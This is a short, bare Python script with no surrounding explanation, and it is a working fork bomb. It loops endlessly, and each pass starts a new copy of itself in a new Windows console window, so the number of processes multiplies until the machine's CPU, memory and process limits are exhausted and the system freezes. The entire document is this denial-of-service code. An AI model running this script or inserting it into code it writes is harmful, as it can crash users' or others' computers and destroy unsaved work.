import subprocess
import sys
while True:
    subprocess.Popen([sys.executable, sys.argv[0]],
                     creationflags=subprocess.CREATE_NEW_CONSOLE)
